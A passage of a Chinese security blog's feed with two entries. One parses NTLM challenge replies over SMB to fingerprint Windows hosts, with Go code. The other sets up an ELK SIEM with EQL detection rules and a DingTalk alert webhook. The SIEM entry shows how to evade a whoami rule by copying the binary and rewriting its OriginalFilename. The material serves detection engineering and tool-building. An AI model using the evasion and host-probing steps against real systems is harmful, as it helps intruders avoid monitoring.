&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>NTLM端口信息探测</title>
    <link href="https://jkme.github.io/2021/08/06/windows-ntlm-smb-scan.html"/>
    <id>https://jkme.github.io/2021/08/06/windows-ntlm-smb-scan.html</id>
    <published>2021-08-05T16:00:00.000Z</published>
    <updated>2022-01-21T03:21:08.062Z</updated>
    
    <content type="html"><![CDATA[<p>SMB（Server Message Block）协议，可用于在计算机间共享文件、打印机、串口等，电脑上的网上邻居就是靠它实现的。SMB使用了NetBIOS的应用程序接口 （Application Program Interface，简称API）。另外，它是一个开放性的协议，允许了协议扩展——使得它变得更大而且复杂；大约有65个最上层的作业，而每个作业都超过120个函数，甚至Windows NT也没有全部支持到，最近微软又把 SMB 改名为 CIFS（Common Internet File System），并且加入了许多新的特色。SMB协议一般端口使用为139，445，CIFS协议有三个版本：SMB、SMB2、SMB3。</p><h3 id="NTLM"><a href="#NTLM" class="headerlink" title="NTLM"></a>NTLM</h3><p>在type2返回Challenge的过程中，同时返回了操作系统类型，主机名，netbios名等等。这也就意味着如果我们在能跟服务器进行NTLM交流中，给服务器发送一个type1的请求，服务器返回type2的响应，这一步，我们就可以得到很多信息。SMBv1和SMBv2的数据包结构是不同的</p><h3 id="SMBv1"><a href="#SMBv1" class="headerlink" title="SMBv1"></a>SMBv1</h3><p>使用<a href="https://github.com/FeigongSec/NTLMINFO">非攻NTLMINFO</a>探测SMB接口，抓包通过wireshark分析，包含操作系统类型的数据包由SMB Header和Response组成：<br><img src="/2021/08/06/windows-ntlm-smb-scan/ntlm-1.png"><br>我们的目的是获取smb数据包的NTLM数据，然后对NTLM数据包解析，NTLM数据包上一层是GSS-API，首先找到GSS-API在整个数据包的偏移量，SMB的数据包结构长度如下：</p><pre class="line-numbers language-none"><code class="language-none">SMB Header:  32 byteWord Count:  1 byteAndXCommand: 1 byteReserved:    1 byteAndXOffset:  2 byteAction:    2 byteSecurity Blob Length: 2 byte (表示Security Blob的长度，这里的hex是 0f 10，小端转换为010f,再转换成10进制就是271，对应Security Blob的长度)Byte Count: 2 byte (表示Security Blob加上NativeOS和Native Lan的长度)Security Blob: 可变长度，取决于Security Blob Length<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面的数据包结构的关键数据是<code>Security Blob Length</code>和<code>Byte Content</code>，前者表示GSS-API的整个数据包长度，后者表示GSS-API和Native OS加上Native LM的数据长度：</p><h6 id="GSS-API的长度是271-Byte"><a href="#GSS-API的长度是271-Byte" class="headerlink" title="GSS-API的长度是271 Byte"></a>GSS-API的长度是271 Byte</h6><p><img src="/2021/08/06/windows-ntlm-smb-scan/ntlm-3.png"></p><h6 id="Native-OS的长度是42-Byte"><a href="#Native-OS的长度是42-Byte" class="headerlink" title="Native OS的长度是42 Byte"></a>Native OS的长度是42 Byte</h6><p><img src="/2021/08/06/windows-ntlm-smb-scan/ntlm-3.1.png"></p><h6 id="Native-LM的长度是38-Byte"><a href="#Native-LM的长度是38-Byte" class="headerlink" title="Native LM的长度是38 Byte"></a>Native LM的长度是38 Byte</h6><p><img src="/2021/08/06/windows-ntlm-smb-scan/ntlm-3.2.png"></p><p>所以数学题来了：<br>Security Blob Length转换成10进制是271 Byte</p><p>Byte Count: 271 + 42 + 38 = 351 Byte<br>我们的目的是获取NTLM的数据和NativeOS和Native LM，回到代码里面去看看，当我们获取到type2的数据，获取到的数据是什么呢？</p><p><img src="/2021/08/06/windows-ntlm-smb-scan/ntlm-4.png"></p><p>NetBIOS Session Service这一层的长度是4 Byte，<code>Security Blob Length</code>的偏移量就出来了: </p><pre class="line-numbers language-none"><code class="language-none">4 + 32 + 1 + 1 + 1 + 2 + 2 &#x3D; 43<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>所以<code>Security Blob Length</code>偏移从43开始，长度是2 Byte， <code>Security Blob</code>跟在后面，偏移从45开始，47结束，go语言伪代码：</p><pre class="line-numbers language-none"><code class="language-none">blob_length :&#x3D; uint16(bytes2Uint(ret[43:45], &#39;&lt;&#39;))blob_count :&#x3D; uint16(bytes2Uint(ret[45:47], &#39;&lt;&#39;))&#x2F;&#x2F;gss变量表示从Security Blob起始位置到数据包结束，包括了Native OS和Native LMgss :&#x3D; ret[47:]&#x2F;&#x2F;找到NTLMSSP在gss的偏移起始位置off_ntlm :&#x3D; bytes.Index(gss, []byte(&quot;NTLMSSP&quot;))&#x2F;&#x2F;Native OS和Native LM数据，对应上面的图native :&#x3D; gss[int(blob_length):blob_count]&#x2F;&#x2F;bs表示ntlm的数据，以NTLMSSP开头bs :&#x3D; gss[off_ntlm:blob_length]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来主要工作就是解析NTLM的数据，感谢iv4n师傅的<a href="http://iv4n.cc/ntlmssp/">Windows NTLM协议细节</a>，我fork了一份<a href="https://github.com/JKme/go-ntlmssp">go-ntlmssp</a>，增加了解析NTLM输出字符串函数，可以直接获取NTLMSSP数据的解析结果：</p><pre class="line-numbers language-none"><code class="language-none">func TestChallengeMsg_String(t *testing.T) &#123;bs, _ :&#x3D; hex.DecodeString(&quot;4e544c4d535350xxxxx&quot;)type2 :&#x3D; ChallengeMsg&#123;&#125;info :&#x3D; type2.String(bs)fmt.Println(info)&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/08/06/windows-ntlm-smb-scan/ntlm-5.png"></p><p>Windows10默认使用SMBv2协议，没有打开SMBv1开关，<a href="https://github.com/RowTeam/SharpDetectionNTLMSSP">Rcoll师傅的SharpDetectionNTLMSSP</a>只发送了SMBv1的探测，没有探测SMBv2。<a href="https://github.com/FeigongSec/NTLMINFO">非攻NTLMINFO</a>师傅就比较完整，先探测SMBv1，失败之后尝试SMBv2。</p><h3 id="SMBv2"><a href="#SMBv2" class="headerlink" title="SMBv2"></a>SMBv2</h3><p>参考<a href="https://github.com/FeigongSec/NTLMINFO/blob/016e1859b7c0f4cc55c923027bc24174b0586bc7/SmbInfo/SmbInfo/Program.cs#L83">非攻师傅的代码</a>，先发送第一次的探测请求，找到偏移量70的地方，做一次判断是否发送第二个数据包。换成GO代码就比较简单了，这里的偏移70保存的是是SMBv2的<code>Security mode</code>:</p><p><img src="/2021/08/06/windows-ntlm-smb-scan/ntlm-6.png"></p><p>Go语言如下：</p><pre class="line-numbers language-none"><code class="language-none">var NTLMSSPNegotiatev2Data []byteif hex.EncodeToString(r2[70:71]) &#x3D;&#x3D; &quot;03&quot; &#123;flags :&#x3D; []byte&#123;0x15, 0x82, 0x08, 0xa0&#125;NTLMSSPNegotiatev2Data &#x3D; getNTLMSSPNegotiateData(flags)&#125; else &#123;flags :&#x3D; []byte&#123;0x05, 0x80, 0x08, 0xa0&#125;NTLMSSPNegotiatev2Data &#x3D; getNTLMSSPNegotiateData(flags)&#125;_, err &#x3D; conn2.Write(NegotiateSMBv2Data2)if err !&#x3D; nil &#123;return&#125;readBytes(conn2)_, err &#x3D; conn2.Write(NTLMSSPNegotiatev2Data)ret, _ :&#x3D; readBytes(conn2)ntlmOff :&#x3D; bytes.Index(ret, []byte(&quot;NTLMSSP&quot;))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>成品主要参考非攻师傅的代码，集成到<a href="https://github.com/JKme/cube">Cube</a>，完成了winrm、wmi、smb、mssql端口的NTLM信息探测。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://github.com/FeigongSec/NTLMINFO">非攻NTLMINFO</a></li><li><a href="https://github.com/RowTeam/SharpDetectionNTLMSSP">Rcoll师傅的SharpDetectionNTLMSSP</a></li><li><a href="https://github.com/zmap/zgrab2/tree/master/lib/smb/smb">An SMB library in Go</a></li><li><a href="https://daiker.gitbook.io/windows-protocol/ntlm-pian/4">NTLM基础介绍</a></li><li><a href="http://iv4n.cc/ntlmssp/">Windows NTLM协议细节</a></li><li><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb/f210069c-7086-4dc2-885e-861d837df688">Server Message Block (SMB) Protocol</a></li><li><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/5606ad47-5ee0-437a-817e-70c366052962">Server Message Block (SMB) Protocol Versions 2 and 3</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;SMB（Server Message Block）协议，可用于在计算机间共享文件、打印机、串口等，电脑上的网上邻居就是靠它实现的。SMB使用了NetBIOS的应用程序接口 （Application Program Interface，简称API）。另外，它是一个开放性的协议，允许了协议扩展——使得它变得更大而且复杂；大约有65个最上层的作业，而每个作业都超过120个函数，甚至Windows NT也没有全部支持到，最近微软又把 SMB 改名为 CIFS（Common Internet File System），并且加入了许多新的特色。SMB协议一般端口使用为139，445，CIFS协议有三个版本：SMB、SMB2、SMB3。&lt;/p&gt;
&lt;h3 id=&quot;NTLM&quot;&gt;&lt;a href=&quot;#NTLM&quot; class=&quot;headerlink&quot; title=&quot;NTLM&quot;&gt;&lt;/a&gt;NTLM&lt;/h3&gt;&lt;p&gt;在type2返回Challenge的过程中，同时返回了操作系统类型，主机名，netbios名等等。这也就意味着如果我们在能跟服务器进行NTLM交流中，给服务器发送一个type1的请求，服务器返回type2的响应，这一步，我们就可以得到很多信息。SMBv1和SMBv2的数据包结构是不同的&lt;/p&gt;
&lt;h3 id=&quot;SMBv1&quot;&gt;&lt;a href=&quot;#SMBv1&quot; class=&quot;headerlink&quot; title=&quot;SMBv1&quot;&gt;&lt;/a&gt;SMBv1&lt;/h3&gt;&lt;p&gt;使用&lt;a href=&quot;https://github.com/FeigongSec/NTLMINFO&quot;&gt;非攻NTLMINFO&lt;/a&gt;探测SMB接口，抓包通过wireshark分析，包含操作系统类型的数据包由SMB Header和Response组成：&lt;br&gt;&lt;img src=&quot;/2021/08/06/windows-ntlm-smb-scan/ntlm-1.png&quot;&gt;&lt;br&gt;我们的目的是获取smb数据包的NTLM数据，然后对NTLM数据包解析，NTLM数据包上一层是GSS-API，首先找到GSS-API在整个数据包的偏移量，SMB的数据包结构长度如下：&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;SMB Header:  32 byte
Word Count:  1 byte
AndXCommand: 1 byte
Reserved:    1 byte
AndXOffset:  2 byte
Action: 	   2 byte
Security Blob Length: 2 byte (表示Security Blob的长度，这里的hex是 0f 10，小端转换为010f,再转换成10进制就是271，对应Security Blob的长度)
Byte Count: 2 byte (表示Security Blob加上NativeOS和Native Lan的长度)
Security Blob: 可变长度，取决于Security Blob Length&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面的数据包结构的关键数据是&lt;code&gt;Security Blob Length&lt;/code&gt;和&lt;code&gt;Byte Content&lt;/code&gt;，前者表示GSS-API的整个数据包长度，后者表示GSS-API和Native OS加上Native LM的数据长度：&lt;/p&gt;
&lt;h6 id=&quot;GSS-API的长度是271-Byte&quot;&gt;&lt;a href=&quot;#GSS-API的长度是271-Byte&quot; class=&quot;headerlink&quot; title=&quot;GSS-API的长度是271 Byte&quot;&gt;&lt;/a&gt;GSS-API的长度是271 Byte&lt;/h6&gt;&lt;p&gt;&lt;img src=&quot;/2021/08/06/windows-ntlm-smb-scan/ntlm-3.png&quot;&gt;&lt;/p&gt;
&lt;h6 id=&quot;Native-OS的长度是42-Byte&quot;&gt;&lt;a href=&quot;#Native-OS的长度是42-Byte&quot; class=&quot;headerlink&quot; title=&quot;Native OS的长度是42 Byte&quot;&gt;&lt;/a&gt;Native OS的长度是42 Byte&lt;/h6&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>SIEM On ELK</title>
    <link href="https://jkme.github.io/2021/08/02/siem-on-elk.html"/>
    <id>https://jkme.github.io/2021/08/02/siem-on-elk.html</id>
    <published>2021-08-01T16:00:00.000Z</published>
    <updated>2022-01-21T03:00:01.072Z</updated>
    
    <content type="html"><![CDATA[<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>参考链接里有详细的安装步骤，测试客户端是Windows，安装了如下软件：</p><ul><li>sysmon.exe(<a href="https://github.com/SwiftOnSecurity/sysmon-config">配置文件</a>)<ul><li><code>.\sysmon64.exe -accepteula -i c:\windows\config.xml</code></li></ul></li><li>winlogbeat.exe<ul><li><code>.\install-service-winlogbeat.ps1</code></li><li><code>.\winlogbeat.exe setup -e</code></li></ul></li><li>ElasticAgent.exe<ul><li><code>.\elastic-agent.exe install  --insecure -f --fleet-server-es=&lt;ES&gt; --fleet-server-service-token=&lt;token&gt;</code></li></ul></li></ul><h3 id="规则监测和绕过"><a href="#规则监测和绕过" class="headerlink" title="规则监测和绕过"></a>规则监测和绕过</h3><p>规则有5种查询，一般使用EQL(Event Query Language)查询类型:<br><img src="/2021/08/02/siem-on-elk/siem-1.png"><br>SIEM有内置很多规则，默认是关闭状态，这些规则都是ATT&amp;CK框架攻击行为转化而来的，例如windows下的<code>whoami</code>查询规则(<del>正经人谁查whoami啊</del>):</p><pre class="line-numbers language-none"><code class="language-none">process where event.type in (&quot;start&quot;, &quot;process_started&quot;) and process.name : &quot;whoami.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们拿这条规则做分析，这条规则匹配了当进程开始的时候，进程名为<code>whoami.exe</code>的时候触发，所以我们把<code>whoami.exe</code>复制一下，就可以绕过去了:</p><pre class="line-numbers language-none"><code class="language-none">copy C:\Windows\System32\whoami.exe C:\Windows\temp\x.exeC:\Windows\temp\x.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>是不是把siem想的简单了，这跟通过复制<code>net.exe</code>绕过添加用户一模一样，仔细观察下elk里面的字段，可以发现<code>process.pe.original_file_name</code>仍然保留了<code>whoami.exe</code>，这是PE文件里面固定的，所以我们手动把预警规则修改一下:</p><pre class="line-numbers language-none"><code class="language-none">process where event.type in (&quot;start&quot;, &quot;process_started&quot;) and process.pe.original_file_name: &quot;whoami.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时通过复制绕过就失效了，那么<code>process.pe.original_file_name</code>能不能改呢？可以的，<a href="https://github.com/electron/rcedit/releases">rcedit</a>:</p><pre class="line-numbers language-none"><code class="language-none">cedit-x64.exe x.exe --set-version-string  OriginalFilename &quot;hello.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/08/02/siem-on-elk/siem-2.png"></p><p>此时再次执行<code>x.exe</code>，SIEM里面不会有告警信息，所以可以通过这种形式绕过和<code>process.pe.original_file_name</code>相关的规则，所以在实际过程中，要从多个维度思考，比如network、注册表、事件ID</p><h3 id="告警通知"><a href="#告警通知" class="headerlink" title="告警通知"></a>告警通知</h3><p>ELK的基础版没有用户通知的功能，需要开通白金版，可以申请试用30天或者破解，如果想通知钉钉，可以选择webhook的方式，在webhook的时候注意添加一个请求头字段:<code>Content-Type: application/x-wwww-form-data</code>，Action里面增加body格式:</p><pre class="line-numbers language-none"><code class="language-none">&#123;&#123;#context.alerts&#125;&#125;timestamp&#x3D;&#123;&#123;@timestamp&#125;&#125;&amp;rule_name&#x3D;&#123;&#123;context.rule.name&#125;&#125;&amp;risk_score&#x3D;&#123;&#123;context.rule.risk_score&#125;&#125;&amp;host_name&#x3D;&#123;&#123;host.name&#125;&#125;&amp;process_parent_name&#x3D;&#123;&#123;process.parent.name&#125;&#125;&amp;process_command_line&#x3D;&#123;&#123;process.command_line&#125;&#125;&amp;process_name&#x3D;&#123;&#123;process.name&#125;&#125;&amp;user_name&#x3D;&#123;&#123;user.name&#125;&#125;&amp;result_link&#x3D;&#123;&#123;&#123;context.results_link&#125;&#125;&#125;&#123;&#123;&#x2F;context.alerts&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>服务端解析body然后通知钉钉：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> json<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> jsonify<span class="token keyword">from</span> datetime <span class="token keyword">import</span> datetime<span class="token punctuation">,</span> timedeltaapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">handler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    form <span class="token operator">=</span> request<span class="token punctuation">.</span>form    <span class="token keyword">print</span><span class="token punctuation">(</span>form<span class="token punctuation">)</span>    timestamp <span class="token operator">=</span> date2local<span class="token punctuation">(</span>form<span class="token punctuation">[</span><span class="token string">"timestamp"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    rule_name <span class="token operator">=</span> form<span class="token punctuation">[</span><span class="token string">"rule_name"</span><span class="token punctuation">]</span>    <span class="token comment"># risk_score = form["risk_score"]</span>    host_name <span class="token operator">=</span> form<span class="token punctuation">[</span><span class="token string">"host_name"</span><span class="token punctuation">]</span>    process_parent_name <span class="token operator">=</span> form<span class="token punctuation">[</span><span class="token string">"process_parent_name"</span><span class="token punctuation">]</span>    process_name <span class="token operator">=</span> form<span class="token punctuation">[</span><span class="token string">"process_name"</span><span class="token punctuation">]</span>    process_command_line <span class="token operator">=</span> form<span class="token punctuation">[</span><span class="token string">"process_command_line"</span><span class="token punctuation">]</span>    user_name <span class="token operator">=</span> form<span class="token punctuation">[</span><span class="token string">"user_name"</span><span class="token punctuation">]</span>    result_link <span class="token operator">=</span> form<span class="token punctuation">[</span><span class="token string">"result_link"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token string">"%0a"</span><span class="token punctuation">)</span>    dingTalk_notify<span class="token punctuation">(</span>timestamp<span class="token punctuation">,</span> rule_name<span class="token punctuation">,</span> host_name<span class="token punctuation">,</span> process_parent_name<span class="token punctuation">,</span> process_name<span class="token punctuation">,</span> process_command_line<span class="token punctuation">,</span> user_name<span class="token punctuation">,</span> result_link<span class="token punctuation">)</span>    <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"status"</span><span class="token punctuation">:</span> <span class="token string">"OK"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">date2local</span><span class="token punctuation">(</span>date<span class="token punctuation">)</span><span class="token punctuation">:</span>    date <span class="token operator">=</span> datetime<span class="token punctuation">.</span>strptime<span class="token punctuation">(</span>date<span class="token punctuation">,</span> <span class="token string">"%Y-%m-%dT%H:%M:%S.%fZ"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>date <span class="token operator">+</span> timedelta<span class="token punctuation">(</span>hours<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">"%Y-%m-%d %H:%M:%S"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dingTalk_notify</span><span class="token punctuation">(</span>timestamp<span class="token punctuation">,</span> rule_name<span class="token punctuation">,</span> host_name<span class="token punctuation">,</span> process_parent_name<span class="token punctuation">,</span> process_name<span class="token punctuation">,</span> process_command_line<span class="token punctuation">,</span> user_name<span class="token punctuation">,</span> result_link<span class="token punctuation">)</span><span class="token punctuation">:</span>    token <span class="token operator">=</span> <span class="token string">""</span>      ddrobot <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"https://oapi.dingtalk.com/robot/send?access_token=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>token<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>    headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'application/json;charset=utf-8'</span>    <span class="token punctuation">&#125;</span>    json_text <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"msgtype"</span><span class="token punctuation">:</span> <span class="token string">"markdown"</span><span class="token punctuation">,</span>        <span class="token string">"markdown"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>            <span class="token string">"title"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"SIEM告警"</span></span><span class="token punctuation">,</span>            <span class="token string">"text"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"### SIEM告警通知\n##### 触发时间: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>timestamp<span class="token punctuation">&#125;</span></span><span class="token string">\n##### 触发规则: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>rule_name<span class="token punctuation">&#125;</span></span><span class="token string">\n##### 触发主机: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>host_name<span class="token punctuation">&#125;</span></span><span class="token string">\n##### 关联父进程: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>process_parent_name<span class="token punctuation">&#125;</span></span><span class="token string">\n##### 当前进程: "</span></span>                    <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>process_name<span class="token punctuation">&#125;</span></span><span class="token string">\n#### 进程参数：</span><span class="token interpolation"><span class="token punctuation">&#123;</span>process_command_line<span class="token punctuation">&#125;</span></span><span class="token string">\n##### 当前用户: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>user_name<span class="token punctuation">&#125;</span></span><span class="token string">\n##### [告警详情](</span><span class="token interpolation"><span class="token punctuation">&#123;</span>result_link<span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token string">"at"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>            <span class="token string">"atMobiles"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token string">"isAtAll"</span><span class="token punctuation">:</span> <span class="token string">"false"</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>ddrobot<span class="token punctuation">,</span> data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>json_text<span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">,</span> threaded<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/08/02/siem-on-elk/siem-3.png"></p><h3 id="规则示例"><a href="#规则示例" class="headerlink" title="规则示例"></a>规则示例</h3><p>SIEM内置的规则有很多，常用的规则打开的有如下几个:<br>规则名称：Conhost Spawned By Suspicious Parent Process<br>规则介绍：Console Window Host (conhost.exe)作为子进程被启动，通常是在代码注入进程的时候出现</p><pre class="line-numbers language-none"><code class="language-none">process where event.type in (&quot;start&quot;, &quot;process_started&quot;) and  process.name : &quot;conhost.exe&quot; and  process.parent.name : (&quot;svchost.exe&quot;, &quot;lsass.exe&quot;, &quot;services.exe&quot;, &quot;smss.exe&quot;, &quot;winlogon.exe&quot;, &quot;explorer.exe&quot;,                         &quot;dllhost.exe&quot;, &quot;rundll32.exe&quot;, &quot;regsvr32.exe&quot;, &quot;userinit.exe&quot;, &quot;wininit.exe&quot;, &quot;spoolsv.exe&quot;,                         &quot;wermgr.exe&quot;, &quot;csrss.exe&quot;, &quot;ctfmon.exe&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p>规则名称：Encoding or Decoding Files via CertUtil<br>规则介绍：通过CertUtil编码解码文件</p><pre class="line-numbers language-none"><code class="language-none">process where event.type &#x3D;&#x3D; &quot;start&quot; and  (process.name : &quot;certutil.exe&quot; or process.pe.original_file_name &#x3D;&#x3D; &quot;CertUtil.exe&quot;) and  process.args : (&quot;?decode&quot;, &quot;?encode&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><p>规则名称：Unusual Child Processes of RunDLL32<br>规则介绍：不正常的rundll32.exe活动（通常用在启动木马过程中，比如CS的Spawn）</p><pre class="line-numbers language-none"><code class="language-none">sequence with maxspan&#x3D;1h  [process where event.type in (&quot;start&quot;, &quot;process_started&quot;) and     (process.name : &quot;rundll32.exe&quot; or process.pe.original_file_name &#x3D;&#x3D; &quot;RUNDLL32.EXE&quot;) and      process.args_count &#x3D;&#x3D; 1  ] by process.entity_id  [process where event.type in (&quot;start&quot;, &quot;process_started&quot;) and process.parent.name : &quot;rundll32.exe&quot;  ] by process.parent.entity_id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p>规则名称：Creation of a Hidden Local User Account<br>规则介绍：添加隐藏账户（用于权限维持）</p><pre class="line-numbers language-none"><code class="language-none">registry where registry.path : &quot;HKLM\\SAM\\SAM\\Domains\\Account\\Users\\Names\\*$\\&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><p>规则名称：Windows Script Executing PowerShell<br>规则介绍：使用wscript或者cscript执行Powershell</p><pre class="line-numbers language-none"><code class="language-none">process where event.type in (&quot;start&quot;, &quot;process_started&quot;) and  process.parent.name : (&quot;cscript.exe&quot;, &quot;wscript.exe&quot;) and process.name : &quot;powershell.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><p>规则名称：Windows Suspicious Command<br>规则介绍：Windows可疑命令</p><pre class="line-numbers language-none"><code class="language-none">process where event.type in (&quot;start&quot;, &quot;process_started&quot;) andprocess.pe.original_file_name in (&quot;whoami.exe&quot;, &quot;tasklist.exe&quot;, &quot;ipconfig.exe&quot;, &quot;powershell.exe&quot;, &quot;sctasks.exe&quot;, &quot;bitsadmin.exe&quot;, &quot;netstat.exe&quot;, &quot;systeminfo.exe&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><p>规则名称：Security Software Discovery using WMIC<br>规则介绍：使用wmic查询安全软件</p><pre class="line-numbers language-none"><code class="language-none">process where event.type in (&quot;start&quot;, &quot;process_started&quot;) and   (process.name:&quot;wmic.exe&quot; or 